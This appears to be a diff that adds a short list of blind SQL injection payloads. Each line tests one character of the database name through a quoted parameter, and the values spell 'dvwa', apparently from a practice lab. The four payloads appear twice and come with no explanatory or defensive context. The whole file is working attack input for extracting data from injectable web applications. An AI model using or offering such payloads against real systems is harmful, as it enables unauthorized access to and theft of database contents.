@@ -1,0 +1,8 @@
+1' and ord(substr(database(), 1, 1)) = 100 #
+1' and ord(substr(database(), 2, 1)) = 118 #
+1' and ord(substr(database(), 3, 1)) = 119 #
+1' and ord(substr(database(), 4, 1)) = 97 #
+1' and ord(substr(database(), 1, 1)) = 100 #
+1' and ord(substr(database(), 2, 1)) = 118 #
+1' and ord(substr(database(), 3, 1)) = 119 #
+1' and ord(substr(database(), 4, 1)) = 97 #
